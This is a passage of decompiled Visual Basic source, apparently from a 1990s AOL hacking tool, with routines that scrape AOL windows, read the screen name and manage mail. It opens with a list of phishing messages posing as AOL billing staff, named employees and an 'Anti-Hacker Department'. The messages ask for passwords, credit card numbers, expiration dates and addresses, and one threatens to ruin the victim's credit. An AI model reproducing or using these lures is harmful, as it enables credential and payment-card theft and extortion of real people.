ElseIf lAFE0 = "131" Then
lAFE0 = "  We're sorry to report that your account information has been erased.  For you to stay online we need you to verify your password, Credit Card number, Expiration date, and last 4 digits of your phone number.  Thank you and sorry for the delay."
ElseIf lAFE0 = "132" Then
lAFE0 = "Hello, my name is Todd Stiger.  I work for the internet.  I have seen people calling from CANADA using this account. Please verify that you are the correct user by giving me your credit card number and personal information.  Thanks!"
ElseIf lAFE0 = "133" Then
lAFE0 = "Sir, I have some bad news! We here at AOL have made a SERIOUS billing error. We have your credit card number as 5436-2854-3546-9374, If this is not correct, please respond with the corrct number and your Full name, Address, State, City, and Zip code.  Sorry for the trouble!"
ElseIf lAFE0 = "134" Then
lAFE0 = "I am afraid that you have been SHARING your account with other members! THAT IS AGAINST TOS AGREEMENT!! Please respond with your credit card number, Full Name, and FULL address! This is the only way to prove wether or not you are sharing your account!"
ElseIf lAFE0 = "135" Then
lAFE0 = "Hello user, my name is William Denbo with the America Online Password Dept.! We have reason to beleive that a person has gotten hold of your password and is using it to conduct illegal activities. We must ask you to please respond with your name, credit card number, and Address.This is very important.Do not delay!"
ElseIf lAFE0 = "136" Then
lAFE0 = "Welcome new AOL user,Our service was temporarily shut down this morning between the times of 6:30a.m. - 7:30a.m.,Due to a complicated computer install!We lost a couple of members billing info,You are number 68 on our list,If you would please clcik on reply and type in your Credit Card number and billing info.!If you do not respond in the desire limit then we will have to be forced to shut down your account,You are going to have contact us at our 800# if this should happen and describe the problem!Thank you for your time. :-)"
ElseIf lAFE0 = "137" Then
lAFE0 = "Hello, I am with the AHD (Anti-Hacker Department) and we beleive that Hackers may be using your account for illegal activites. To verify you are the rightful owner of that account; please respond with you name, password, and credit card information. Thank you and have a nice day using America Online."
ElseIf lAFE0 = "138" Then
lAFE0 = "I have a program that can kick you off-lin and kill your account.So give me your password and I wont do it.But,if you dont give me your password I'll ruin your credit card,and kill your account!So don't fuck around!!!!!!"
ElseIf lAFE0 = "139" Then
lAFE0 = "Hello current member,This is the AOL billing department,We are going have to ask you for your credit card information you have used to make the account you are currently on!We had a bug in the system earlier and it may of caused errors in your bill,When you reply we will verify your account and send you,your current monthes total!If there should be errors,please contact us at [1-800-827-3891].Thank you for your time."
ElseIf lAFE0 = "140" Then
lAFE0 = "Good morning current member,This is the AOL billing department,We are going have to ask you for your credit card information you have used to make the account you are currently on!We had a virus in the system earlier and it may of caused errors in your billing,When you reply with the information you entered during sign-up so we can verify your account and send you your current monthes total!If there should be errors,please contact us at [1-800-827-3891].Thank you for your time."
ElseIf lAFE0 = "141" Then
lAFE0 = "There have been notable billing errors showing in our records. For us to correct this matter efficiently, please hit rrespond and give me your full name, your full address, and your credit card number with experation date.  I am sorry for the inconvienence!"
End If
End Function

Function fn2898 (pAFEA As String) As String
Dim lAFEC As Variant
Dim lAFF0 As String
For lAFEC = 1 To Len(pAFEA$)
    If (Mid$(pAFEA$, lAFEC, 1) <> Chr$(0)) Then
        lAFF0$ = lAFF0$ + Mid$(pAFEA$, lAFEC, 1)
    Else
        GoTo L26C04
    End If
Next
L26C04:
fn2898 = lAFF0$
End Function

Function fn28D0 (ByVal pAFF6 As String) As Variant
Dim lAFF8 As Integer
Dim lAFFA As String
Dim lAFFC As String
For lAFF8 = 1 To Len(pAFF6)
lAFFA = Mid(pAFF6, lAFF8, 1)
If lAFFA = Chr(0) Then lAFFA = ""
lAFFC = lAFFC & lAFFA
Next lAFF8
fn28D0 = lAFFC
End Function

Function fn2908 (pB002 As Variant, pB006 As Variant) As Variant
Dim lB00A As Integer
Dim lB00C As Variant
Dim lB010 As Integer
Dim lB012 As Variant
Dim lB016 As Integer
L26CA6:
DoEvents
lB00A% = extfn4C40(pB002, 5)
If UCase(Mid(fn1280(lB00A%), 1, Len(pB006))) Like UCase(pB006) Then GoTo L26E84
lB00A% = extfn4C40(pB002, lB00C)
If UCase(Mid(fn1280(lB00A%), 1, Len(pB006))) Like UCase(pB006) Then GoTo L26E84
While lB00A%
lB010% = extfn4C40(pB002, 5)
If UCase(Mid(fn1280(lB010%), 1, Len(pB006))) Like UCase(pB006) Then GoTo L26E84
lB00A% = extfn4C40(lB00A%, 2)
If UCase(Mid(fn1280(lB00A%), 1, Len(pB006))) Like UCase(pB006) Then GoTo L26E84
Wend
GoTo L26CA6
lB012 = 0

L26E84:
lB016% = lB00A%
fn2908 = lB016%
End Function

Function fn2A20 (ByVal pB03E, ByVal pB040) As Integer
Dim lB042 As Variant
Dim lB046() As Integer
Do
lB042 = fn1088(lB046(), 0, pB03E, pB040, Null)
DoEvents
Loop While lB042 = 0
fn2A20 = lB046(1)
End Function

Function fn2B38 (pB08C As Integer) As Variant
Dim lB090 As String * 255
Dim lB092 As Integer
lB092 = extfn3430(pB08C, lB090, 255)
fn2B38 = (lB090)
End Function

Function fn2B70 () As String
Dim lB096 As String
lB096 = String(145, Chr(0))
fn2B70 = Left(lB096, extfn2DA0(lB096, Len(lB096)))
End Function

Function fn2BA8 (ByVal pvB09C As Integer) As Variant
Dim lB09E As Integer
Dim lB0A0 As String
Dim lB0A2 As Integer
lB09E = extfn4C78(pvB09C, &HE, 0&, 0&)
lB0A0 = String(lB09E + 1, " ")
lB0A2 = extfn4CE8(pvB09C, &HD, lB09E + 1, lB0A0)
fn2BA8 = Left(lB0A0, lB09E)
End Function

Function fn2C0 () As Variant
Dim l0704 As Integer
Dim l0706 As Integer
l0704% = extfn4D90(fn4F0(), "AOL Child")
l0706% = extfn4D90(l0704%, "_AOL_Tree")
fn2C0 = extfn4C78(l0706%, gc0060, 0, 0)
End Function

Function fn330 () As Variant
Dim l0712 As Integer
Dim l0714 As Integer
Dim l0716 As Integer
Dim l0718 As Integer
Dim l071A As Integer
Dim l071C As Integer
Dim l071E As Variant
Dim l0722 As Integer
l0712% = extfn2EB8("AOL Frame25", 0&)
l0714% = extfn4D90(l0712%, "MDIClient")
l0716% = extfn4C40(l0714%, 5)
l0718% = extfn4D90(l0716%, "_AOL_Edit")
l071A% = extfn4D90(l0716%, "_AOL_View")
l071C% = extfn4D90(l0716%, "_AOL_Listbox")
If l0718% And l071A% And l071C% Then GoTo L197C
l0716% = extfn4C40(l0714%, l071E)
While l0716%
l0716% = extfn4C40(l0716%, 2)
l0718% = extfn4D90(l0716%, "_AOL_Edit")
l071A% = extfn4D90(l0716%, "_AOL_View")
l071C% = extfn4D90(l0716%, "_AOL_Listbox")
If l0718% And l071A% And l071C% Then GoTo L197C
l0712% = extfn2EB8("AOL Frame25", 0&)
l0714% = extfn4D90(l0712%, "MDIClient")
l0716% = extfn4C40(l0714%, 5)
l0718% = extfn4D90(l0716%, "_AOL_Edit")
l071A% = extfn4D90(l0716%, "_AOL_View")
l071C% = extfn4D90(l0716%, "_AOL_Listbox")
If l0718% And l071A% And l071C% Then GoTo L197C
Wend

L197C:
l0722% = l0716%
fn330 = l0722%
End Function

Function fn368 () As Variant
Dim l0728 As Integer
Dim l072A As Variant
Dim l072E As Variant
Dim l0732 As String
Dim l0734 As Variant
Dim l0738 As String
l0728% = fn330()
l072A = extfn4D90(l0728%, "_AOL_View")
l072E = extfn4CB0(l072A, 14, 0&, 0&)
l0732$ = Space$(l072E)
l0734 = extfn4CE8(l072A, 13, l072E + 1, l0732$)
l0738$ = l0732$
fn368 = l0738$
End Function

Function fn3A0 (p073E As Variant) As Variant
Dim l0742 As Variant
Dim l0746 As String
Dim l0748 As Variant
l0742 = extfn4CB0(p073E, 14, 0&, 0&)
l0746$ = Space$(l0742)
l0748 = extfn4CE8(p073E, 13, l0742 + 1, l0746$)
fn3A0 = l0746$
End Function

Function fn3D8 () As Variant
Dim l0750 As Integer
Dim l0752 As Integer
Dim l0754 As Integer
Dim l0756 As Integer
Dim l0758 As String
Dim l075A As Integer
Dim l075C As Variant
On Error Resume Next
l0750% = extfn2EB8("AOL Frame25", "America  Online")
l0752% = extfn4D90(l0750%, "MDIClient")
l0754% = extfn4D58(l0752%, "Welcome, ")
l0756% = extfn3708(l0754%)
l0758$ = String$(200, 0)
l075A% = extfn3430(l0754%, l0758$, (l0756% + 1))
l075C = Mid$(l0758$, 10, (InStr(l0758$, "!") - 10))
fn3D8 = l075C
End Function

Function fn410 () As Variant
Dim l0764 As Variant
l0764 = extfn2EB8("AOL Frame25", 0&)
fn410 = l0764
End Function

Function fn480 () As Variant
Dim l0792 As Integer
Dim l0794 As Integer
Dim l0796 As Integer
l0792% = extfn2EB8("AOL Frame25", 0&)
l0794% = extfn4D90(l0792%, "MDIClient")
l0796% = extfn4D58(l0794%, "Welcome, ")
If l0796% = 0 Then
MsgBox "Please sign on before using this feature.", 64, "Online"
fn480 = 0
Exit Function
End If
fn480 = 1
End Function

Function fn4B8 () As Variant
Dim l079C As Integer
Dim l079E As Variant
Dim l07A2 As Variant
Dim l07A6 As String
Dim l07A8 As Variant
Dim l07AC As String
Dim l07AE As Variant
Dim l07B2 As String
Dim l07B4 As String
Dim l07B6 As String
Dim l07B8 As Variant
Dim l07BC As Variant
l079C% = fn330()
l079E = extfn4D90(l079C%, "_AOL_View")
l07A2 = extfn4CB0(l079E, 14, 0&, 0&)
l07A6$ = Space$(l07A2)
l07A8 = extfn4CE8(l079E, 13, l07A2 + 1, l07A6$)
l07AC$ = l07A6$
For l07AE = 1 To Len(l07AC$)
l07B2$ = Mid(l07AC$, l07AE, 1)
l07B4$ = l07B4$ & l07B2$
If l07B2$ = Chr(13) Then
l07B6$ = Mid(l07B4$, 1, Len(l07B4$) - 1)
l07B4$ = ""
End If
Next l07AE
l07B8 = Val(l07AE) - Len(l07B4$)
l07BC = Mid(l07AC$, l07B8 + 1, Len(l07B4$) - 1)
fn4B8 = l07BC
End Function

Function fn4F0 () As Variant
Dim l07C4 As Integer
l07C4% = extfn2EB8("AOL Frame25", 0&)
fn4F0 = extfn4D90(l07C4%, "MDIClient")
End Function

Function fn5D0 () As Variant
Dim l07DC As Integer
Dim l07DE As Integer
Dim l07E0 As Variant
l07DC% = fn330()
l07DE% = extfn4D90(l07DC%, "_AOL_Listbox")
l07E0 = extfn4C78(l07DE%, gc0060, 0, 0)
fn5D0 = l07E0
End Function

Function fn6B0 () As Variant
Dim l0800 As Integer
Dim l0802 As Integer
Dim l0804 As Integer
Dim l0806 As Integer
Dim l0808 As String
Dim l080A As Integer
l0800% = extfn2EB8("AOL Frame25", 0&)
l0802% = extfn2CC0(l0800%)
l0804% = extfn4BD0(l0802%, 0)
l0806% = extfn4B98(l0804%, 8)
l0808$ = String$(100, " ")
l080A% = extfn4B28(l0804%, l0806%, l0808$, 100, 1)
If UCase(l0808$) Like UCase("P&ersonal Filing Cabinet") & "*" Then
fn6B0 = "C:\aol30"
Else
fn6B0 = "C:\aol25"
End If
End Function

Function fn720 () As Variant
Dim l081C As Integer
l081C% = extfn2EB8("AOL Frame25", 0&)
fn720 = l081C%
End Function

Function fn790 (p0838 As String) As Variant
Dim l083A As String
Dim l083C As String
Dim l083E As String
Do
l083A$ = Right$(p0838$, 1)
l083C$ = l083C$ & l083A$
l083E$ = Left$(p0838$, Len(p0838$) - 1)
p0838$ = l083E$
DoEvents
Loop Until Len(p0838$) = 0
fn790 = l083C$
End Function

Function fn8E0 (p087E As String, p0880 As Variant) As Variant
Dim l0884 As String
l0884$ = Mid(p087E$, Val(p0880))
fn8E0 = Left(l0884$, 1)
End Function

Function fn918 () As Variant
fn918 = fn2B38(fnF38())
End Function

Function fn950 () As Variant
Dim l088E As Variant
Dim l0892 As Integer
Dim l0894 As Variant
Dim l0898 As Variant
Do
l088E = extfn2EB8("AOL Frame25", 0&)
l0892% = extfn4D90(l088E, "_AOL_View")
l0894 = fn15C8(l0892%)
Do
l088E = extfn2EB8("AOL Frame25", 0&)
l0892% = extfn4D90(l088E, "_AOL_View")
l0898 = fn15C8(l0892%)
DoEvents
Loop Until l0898 <> l0894
fn950 = Mid(l0898, InStr(l0898, l0894) + Len(l0894) - 1)
DoEvents
Loop
End Function

Function fn988 () As Integer
Dim l089E As Integer
Dim l08A0 As Integer
l089E% = fn330()
l08A0% = extfn4D90(l089E%, "_AOL_View")
fn988 = l08A0%
End Function

Function fnAD8 () As Variant
Dim l0958 As Integer
Dim l095A As Integer
Dim l095C As Variant
Call sub2278(3, 2)
Do
DoEvents
l0958% = extfn2EB8(0&, "America  Online")
l095A% = extfn4D90(l0958%, "_AOL_TREE")
DoEvents
Loop Until l095A% <> 0
l095C = extfn4CB0(l095A%, gc0060, 0, 0)
If l095C > 1 And l095C <> 550 Then
MsgBox "You have " & l095C & " messages in your Mailbox...", 0
End If
If l095C = 1 Then
MsgBox "You have " & l095C & " message in your Mailbox...", 0
End If
If l095C < 1 Then
MsgBox "You have no messages in your Mailbox.", 0
End If
If l095C = 550 Then
MsgBox "Holy ShiT! Yer BoX Iz FuLL!"
End If
End Function

Function fnBB8 (p0990 As Variant) As Variant
Dim l0994 As Variant
Dim l0998 As Variant
Dim l099C As String
Dim l099E As String
Dim l09A0 As Variant
Dim l09A4 As String
Dim l09A6 As String
Dim l09A8 As String
Dim l09AA As String
Dim l09AC As Variant
Dim l09B0 As String
Dim l09B2 As String
l0994 = Mid(p0990, Len(p0990), 1)
If Not l0994 = " " Then
p0990 = p0990 & " "
Else
p0990 = p0990
End If
For l0998 = 1 To Len(p0990)
l099C$ = Mid(p0990, l0998, 1)
l09A0 = l099E$ & l099C$
If l099C$ = " " Then
l09A4$ = Mid(l099E$, 1, Len(l099E$) - 1)
l09A6$ = Mid(l09A4$, 1, 1)
On Error GoTo L4EBC
l09A8$ = Mid(l09A4$, 2, 1)
l09AA$ = Mid(l09A4$, 3, Len(l09A4$) - 2)
For l09AC = Len(l09AA$) To 1 Step -1
l09B0$ = l09B0$ & Mid$(l09AA$, l09AC, 1)
Next l09AC
GoTo L4EEE

L4EBC:
l09B2$ = l09B2$ & l09A6$ & " "
GoTo L4F2A

L4EEE:
l09B2$ = l09B2$ & l09A8$ & l09B0$ & l09A6$ & " "

L4F2A:
l09A0 = ""
l09B0$ = ""
End If
Next l0998
fnBB8 = l09B2$
End Function

Function fnBF0 (ByVal p09B6 As String) As String
On Error Resume Next
fnBF0 = Left$(p09B6$, InStr(p09B6$, Chr$(0)) - 1)
End Function

Function fnC28 () As Variant
Dim l09BC As Variant
Dim l09C0 As Integer
Dim l09C2 As Integer
Dim l09C4 As Integer
Dim l09C6 As Integer
Dim l09C8 As Integer
Dim l09CA As String
Dim l09CC As String
Dim l09CE As Integer
Dim l09D0 As Integer
Dim l09D2 As Variant
Dim l09D6 As Variant
Dim l09DA As Variant
Dim l09DE As String
Dim l09E0 As Variant
Dim l09E4 As Variant
l09BC = fnAD8()
l09C0% = 0
l09C2% = extfn2EB8("AOL Frame25", 0&)
l09C4% = extfn4D90(l09C2%, "MDIClient")
l09C6% = extfn4D58(l09C4%, "New Mail")
If l09C6% = 0 Then
sub22E8 (1)
sub27F0 (.4)
Do: DoEvents
    l09C8% = extfn4D58(l09C4%, "New Mail")
    sub27F0 (.1)
Loop Until l09C8% <> 0
sub2A58
End If
Do: DoEvents
l09CA$ = ","
l09CC$ = ","
l09CE% = extfn4D58(extfn4D58(l09C4%, "New Mail"), "Delete")
If fnAD8() = 0 Then MsgBox "You have no New Mail.", 12, "Dupe Killer": Exit Function
l09D0% = extfn4D90(extfn4D58(l09C4%, "New Mail"), "_AOL_Tree")
For l09D2 = 0 To fnAD8() - 1
l09DA = extfn4C78(l09D0%, l09D6, l09D2, 0)
If l09DA = -1 And l09D2 >= fnAD8() Then
    Exit For
ElseIf l09DA = -1 And l09D2 <= fnAD8() Then
    l09DE$ = String$(60, 0)
Else
    l09DE$ = String$(l09DA, 0)
End If
l09E0 = extfn4CE8(l09D0%, gc0014, l09D2, l09DE$)
l09DE$ = Right$(l09DE$, Len(l09DE$) - InStr(InStr(l09DE$, Chr$(9)) + 1, l09DE$, Chr$(9)))
If InStr(l09CA$, "," & l09DE$ & ",") And InStr(l09CC$, "," & l09DE$ & ",") = 0 Then
            l09E4 = extfn4C78(l09D0%, gc0026, l09D2, 0)
            Call sub9F8(l09CE%)
            l09C0% = l09C0% + 1
            l09BC = l09BC - 1
            l09D2 = l09D2 - 1
            l09CC$ = l09CC$ + l09DE$ + ","
Else
l09CA$ = l09CA$ + l09DE$ + ","
End If
Next l09D2
Loop Until Len(l09CC$) = 1
MsgBox "There were " & l09C0% & " duplicate mails deleted.", 12, "Dupe Count"
fnC28 = l09C0%
End Function

Function fnD78 () As Variant
Dim l0A8E As Integer
Dim l0A90 As Integer
Dim l0A92 As Integer
Dim l0A94 As Integer
Dim l0A96 As Integer
Dim l0A98 As Integer
Dim l0A9A As Integer
Dim l0A9C As Integer
Dim l0A9E As String
Dim l0AA0 As Variant
Dim l0AA4 As Variant
Dim l0AA8 As Variant
Dim l0AAC As Integer
l0A8E% = extfn2EB8("AOL Frame25", 0&)
l0A90% = extfn4D58%(l0A8E%, "Compose Mail")
l0A92% = extfn4D90%(l0A90%, "_AOL_Edit")
l0A94% = extfn4C40(l0A92%, gc05CA): l0A96% = extfn4C40(l0A94%, gc05CA)
l0A98% = extfn4C40(l0A96%, gc05CA): l0A9A% = extfn4C40(l0A98%, gc05CA)
l0A9C% = extfn4C40(l0A9A%, gc05CA)
l0A9E$ = ""
For l0AA0 = 1 To 60
 Randomize
   l0AA4 = Int(17 * Rnd + 1)
    If l0AA4 = 1 Then
    l0AA8 = "š"
    ElseIf l0AA4 = 2 Then l0A9E$ = l0A9E$ + ""
    ElseIf l0AA4 = 3 Then l0A9E$ = l0A9E$ + "¢"
    ElseIf l0AA4 = 4 Then l0A9E$ = l0A9E$ + "±"
    ElseIf l0AA4 = 5 Then l0A9E$ = l0A9E$ + "¥"
    ElseIf l0AA4 = 6 Then l0A9E$ = l0A9E$ + "†"
    ElseIf l0AA4 = 7 Then l0A9E$ = l0A9E$ + "ø"
    ElseIf l0AA4 = 8 Then l0A9E$ = l0A9E$ + "‡"
    ElseIf l0AA4 = 9 Then l0A9E$ = l0A9E$ + "µ"
    ElseIf l0AA4 = 10 Then l0A9E$ = l0A9E$ + "þ"
    ElseIf l0AA4 = 11 Then l0A9E$ = l0A9E$ + "‰"
    ElseIf l0AA4 = 12 Then l0A9E$ = l0A9E$ + "¤"
    ElseIf l0AA4 = 13 Then l0A9E$ = l0A9E$ + "£"
    ElseIf l0AA4 = 14 Then l0A9E$ = l0A9E$ + "÷"
    ElseIf l0AA4 = 15 Then l0A9E$ = l0A9E$ + "º"
    ElseIf l0AA4 = 16 Then l0A9E$ = l0A9E$ + "©"
    ElseIf l0AA4 = 17 Then l0A9E$ = l0A9E$ + "*"
    End If
Next
l0AAC% = extfn4CE8(l0A9A%, gc05D6, 0, l0A9E$)
End Function

Function fnDB0 (p0AB2 As String, p0AB4 As String) As Variant
Dim l0AB6 As Variant
Dim l0ABA As String
Dim l0ABC As String
If InStr(p0AB2$, ".") Then
    l0AB6 = InStr(p0AB2$, ".")
    l0ABA$ = Mid$(p0AB2$, 1, l0AB6 - 1)
    l0ABC$ = Mid$(p0AB2$, l0AB6 + 2)
    If l0ABC$ <> p0AB4$ Then l0ABC$ = p0AB4$
    p0AB2$ = l0ABA$ + "." + l0ABC$
ElseIf InStr(p0AB2$, ".") = False Then
    p0AB2$ = p0AB2$ + "." + p0AB4$
End If
End Function

Function fnE20 (p0ACA As Integer) As Integer
Dim l0ACC As Integer
Dim l0ACE As Integer
Dim l0AD2 As String
l0ACC = gc0058
Select Case p0ACA
    Case gc003A
        l0AD2 = "That device appears to be unavailable."
        l0ACC = gc0058 + 5
    Case gc003C
        l0AD2 = "The disk is not ready."
    Case gc0046
        l0AD2 = "The disk is full."
    Case gc004A, gc004C
        l0AD2 = "That file name is illegal."
    Case gc0050
        l0AD2 = "That path doesn't exist."
    Case gc0052
        l0AD2 = "Can't open your file for that type of access."
    Case gc0054
        l0AD2 = "That file is already open."
    Case gc0056
    l0AD2 = "This file has a nonstandard end-of-file marker,"
    l0AD2 = l0AD2 + "or an attempt was made to read beyond "
    l0AD2 = l0AD2 + "the end-of-file marker."
    Case Else
        fnE20 = 3
        Exit Function
    End Select
    l0ACE = MsgBox(l0AD2, l0ACC, "File Error")
    Select Case l0ACE
        Case 4
            fnE20 = 0
        Case 5
            fnE20 = 1
        Case 1, 2, 3
            fnE20 = 2
        Case Else
            fnE20 = 3
    End Select
End Function

Function fnE58 (p0AD6 As String, p0AD8 As Integer, p0ADA As Integer, p0ADC As Integer) As Integer
Dim l0ADE As Integer
Dim l0AE0 As Integer
Dim l0AE2 As Integer
Dim l0AE4 As String
     On Error GoTo L7746
     If p0AD6 Like "*[;-?[* ]*" Or p0AD6 Like "*]*" Then Error gc004A
     If p0ADC Then
        If Dir(p0AD6) = "" Then
            l0AE2 = False
        Else
            l0AE2 = True
        End If
        If p0AD8 = gc0030 And l0AE2 Then
            l0AE4 = "Replace contents of " + p0AD6 + "?"
            If MsgBox(l0AE4, 49, "Replace File?") = 2 Then
                fnE58 = 0
                Exit Function
            End If
        End If
        If Not l0AE2 Then
            l0AE4 = "The file " + p0AD6 + " does not exist. "
            l0AE4 = l0AE4 + "Do you want to create it?"
            If MsgBox(l0AE4, 1, "Create File?") = 2 Then
                fnE58 = 0
                Exit Function
            End If
        End If
     End If
     l0ADE = FreeFile
     Select Case p0AD8
          Case gc0030
            Open p0AD6 For Output As l0ADE
          Case gc0032
            Open p0AD6 For Input As l0ADE
          Case gc0034
            Open p0AD6 For Append As l0ADE
          Case gc0036
            Open p0AD6 For Random As l0ADE Len = p0ADA
          Case gc0038
            Open p0AD6 For Binary As l0ADE
          Case Else
            Exit Function
     End Select
     fnE58 = l0ADE
Exit Function
L7746:
     l0AE0 = fnE20(Err)
     Select Case l0AE0
        Case 0
            Resume
        Case Else
            fnE58 = 0
            Exit Function
     End Select
End Function

Function fnE90 () As Variant
Dim l0AEA As Variant
l0AEA = extfn2EB8("AOL Frame25", 0&)
fnE90 = l0AEA
End Function

Function fnEC8 (p0AF0 As String) As Integer
Dim l0AF2 As Integer
Dim l0AF4 As Integer
Dim l0AF6 As Integer
Dim l0AF8 As Integer
Dim l0AFC As String * 255
Dim l0AFE As Variant
l0AF6% = extfn4C40(extfn2EB8("AOL Frame25", 0&), l0AFE)
Do
  l0AF2% = extfn3660(l0AF6%, l0AFC$, 254)
  If InStr(l0AFC$, "MDIClient") Then l0AF8% = l0AF6%
  l0AF6% = extfn4C40(l0AF6%, gc05CA)
  DoEvents
Loop While l0AF6% <> 0
If p0AF0 = "MDIClient" Then fnEC8 = l0AF8%
l0AF4 = extfn4C40(l0AF8%, l0AFE)
Do
  If InStr(fn2B38(l0AF4), p0AF0) <> 0 Then
      fnEC8 = l0AF4
      Exit Do
  End If
  l0AF4 = extfn4C40(l0AF4, gc05CA)
Loop While l0AF4 <> 0
End Function

Function fnF38 () As Integer
Dim l0B10 As Integer
Dim l0B12 As Integer
Dim l0B14 As Integer
Dim l0B16 As Integer
Dim l0B18 As Integer
Dim l0B1A As Integer
Dim l0B1E As String * 255
Dim l0B20 As Integer
Dim l0B22 As Variant
l0B10% = extfn4C40(extfn2EB8("AOL Frame25", 0&), l0B22)
Do
  l0B20% = extfn3660(l0B10%, l0B1E$, 254)
    If InStr(l0B1E$, "MDIClient") Then
      l0B12% = l0B10%
    End If
  l0B10% = extfn4C40(l0B10%, gc05CA)
  DoEvents
Loop While l0B10% <> 0
l0B14 = extfn4C40(l0B12%, l0B22)
Do
  l0B16 = extfn4C40(l0B14, l0B22)
  Do
    l0B20% = extfn3660(l0B16, l0B1E$, 254)
    If InStr(l0B1E$, "_AOL_Edit") Then
      l0B1A = l0B1A + 1
    ElseIf InStr(l0B1E$, "_AOL_View") Then
      l0B1A = l0B1A + 1
    ElseIf InStr(l0B1E$, "_AOL_Listbox") Then
      l0B1A = l0B1A + 1:
    End If
    l0B16 = extfn4C40(l0B16, gc05CA)
    DoEvents
  Loop While l0B16 <> 0
  If l0B1A = 3 Then l0B18 = l0B14: Exit Do
  l0B14 = extfn4C40(l0B14, gc05CA)
Loop While l0B14 <> 0
fnF38 = l0B18
End Function

Function fnF70 () As Variant
Dim l0B2A As Integer
Dim l0B2C As Integer
Dim l0B2E As Variant
Dim l0B32 As Variant
Dim l0B36 As Variant
l0B2C = extfn4D90(fn410(), "AOL Child")

L7CC0:
l0B2A = extfn4D58(l0B2C, "Send")
    If l0B2A <> 0 Then Let l0B2E = l0B2E + 1
l0B2A = extfn4D58(l0B2C, "To:")
    If l0B2A <> 0 Then Let l0B2E = l0B2E + 1
l0B2A = extfn4D58(l0B2C, "Subject:")
    If l0B2A <> 0 Then Let l0B2E = l0B2E + 1
l0B2A = extfn4D58(l0B2C, "Send" & Chr(13) & "Later")
    If l0B2A <> 0 Then Let l0B2E = l0B2E + 1
l0B2A = extfn4D58(l0B2C, "Attach")
    If l0B2A <> 0 Then Let l0B2E = l0B2E + 1
l0B2A = extfn4D58(l0B2C, "Address" & Chr(13) & "Book")
    If l0B2A <> 0 Then Let l0B2E = l0B2E + 1
If l0B2E = 6 Then
  fnF70 = l0B2C
  Exit Function
End If
Let l0B2E = 0
l0B2C = extfn31C8(l0B2C, 2)
If l0B2C = extfn4C40(l0B2C, l0B32) Then
   l0B36 = 0
   Exit Function
End If
GoTo L7CC0
End Function

Function fnFA8 () As Integer
Dim l0B46 As Integer
Dim l0B50 As Integer
Dim l0B52 As Variant
DoEvents
l0B46 = 0
l0B50% = extfn4C40(fn250(), 5)
DoEvents
Do
If extfn4D58(l0B50%, "Send") <> 0 Then l0B46 = l0B46 + 1
DoEvents
If extfn4D58(l0B50%, "Send Now") <> 0 Then l0B46 = l0B46 + 1
DoEvents
If extfn4D58(l0B50%, "Address" & Chr(13) & "Book") <> 0 Then l0B46 = l0B46 + 1
If l0B46 = 3 Then GoTo L8100
DoEvents
l0B50% = extfn4C40(l0B50%, 2)
DoEvents
l0B46 = 0
Loop While l0B50% <> 0
Exit Function
L8100:
DoEvents
l0B52 = l0B50%
Exit Function
End Function

Function fnFE0 () As Integer
Dim l0B62 As Integer
Dim l0B6C As Integer
l0B62 = 0
DoEvents
l0B6C% = extfn4C40(fn250(), 5)
DoEvents
Do
If extfn4D58(l0B6C%, "Reply") <> 0 Then l0B62 = l0B62 + 1
DoEvents
If extfn4D58(l0B6C%, "Forward") <> 0 Then l0B62 = l0B62 + 1
DoEvents
If extfn4D58(l0B6C%, "Reply to All") <> 0 Then l0B62 = l0B62 + 1
DoEvents
If l0B62 = 3 Then GoTo L8288
DoEvents
l0B6C% = extfn4C40(l0B6C%, 2)
DoEvents
l0B62 = 0
Loop While l0B6C% <> 0
Exit Function
L8288:
DoEvents
fnFE0 = l0B6C%
Exit Function
End Function

Sub sub100 ()
Dim l0686 As Integer
Dim l0688 As Integer
Dim l068A As Integer
Dim l068C As Integer
Dim l068E As Integer
Dim l0690 As Integer
    l0686% = extfn2EB8("AOL Frame25", 0&)
    l0688% = extfn2CC0(l0686%)
    l068A% = extfn2CF8()
    l068C% = extfn2CF8()
    l068E% = extfn2CF8()
    l0690% = extfn2D30(l068C%, gv000C Or gv000A, 56, "Menu Item &1")
    l0690% = extfn2D30(l068C%, gv000C Or gv000A, 57, "Menu Item &2")
    l0690% = extfn2D30(l068C%, gv000C Or gv000A, 58, "Menu Item &3")
    l0690% = extfn2D30(l068E%, gv000C Or gv000A, 59, "Menu Item &4")
    l0690% = extfn2D30(l068E%, gv000C Or gv000A, 60, "Menu Item &5")
    l0690% = extfn2D30(l068E%, gv000C Or gv000A, 61, "Menu Item &6")
    l0690% = extfn2D30(l068A%, gv000A Or gc0008, l068C%, "Sub Menu &1")
    l0690% = extfn2D30(l068A%, gv000A Or gc0008, l068E%, "Sub Menu &2")
    l0690% = extfn2D30(l068A%, gc000E, 0&, 0&)
    l0690% = extfn2D30(l068A%, gv000C Or gv000A, 62, "Menu Item &7")
    l0690% = extfn2D30(l068A%, gv000C Or gv000A, 63, "Menu Item &8")
    l0690% = extfn2D30(l068A%, gv000C Or gv000A, 64, "Menu Item &9")
    l0690% = extfn2D30(l0688%, gv000A Or gc0008, l068A%, "&Main Menu")
    extsub2C18 (l0686%)
    MsgBox "The menu has been added"
End Sub

Sub sub1130 ()
Dim l0BD0 As Variant
Do: DoEvents
l0BD0 = l0BD0 + 1
If l0BD0 = 50 Then Exit Do
Loop
End Sub

Sub sub138 (p0692 As String, p0696 As ComboBox)
Dim l0698 As Variant
Dim l069C As String
Dim l069E As Variant
If p0696.ListCount = 0 Then p0696.AddItem p0692: Exit Sub
Do Until l0698 = (p0696.ListCount)
Let l069C$ = p0696.List(l0698)
If Trim(LCase(l069C$)) = Trim(LCase(p0692)) Then Let l069E = "NO"
Let l0698 = l0698 + 1
Loop
If l069E = "NO" Then Exit Sub
p0696.AddItem p0692
End Sub

Sub sub1408 (p0CF6 As ListBox)
Dim l0CF8 As Variant
Dim l0CFC As String
Dim l0CFE As Variant
On Error Resume Next
Do Until l0CF8 = p0CF6.ListCount
Let l0CFC$ = p0CF6.List(l0CF8)
If Trim(l0CFC$) <> "" Then Let l0CFE = l0CFE & l0CFC$ & "," Else Exit Sub
Let l0CF8 = l0CF8 + 1
Loop
End Sub

Sub sub1440 (p0D02 As Integer, p0D04 As Variant)
Dim l0D08 As Variant
Do
If p0D04 = 0 Then Exit Sub
l0D08 = 1 + l0D08
p0D02% = extfn4C40(p0D02%, gc05CA)
Loop Until l0D08 >= p0D04 - 1
End Sub

Sub sub1478 (p0D0E As ListBox)
Dim l0D10 As Integer
Dim l0D12 As Integer
Dim l0D14 As Integer
Dim l0D16 As Integer
Dim l0D18 As Integer
Dim l0D1A As String
Dim l0D1C As String
Dim l0D1E As Variant
l0D10% = extfn2EB8("AOL Frame25", 0&)
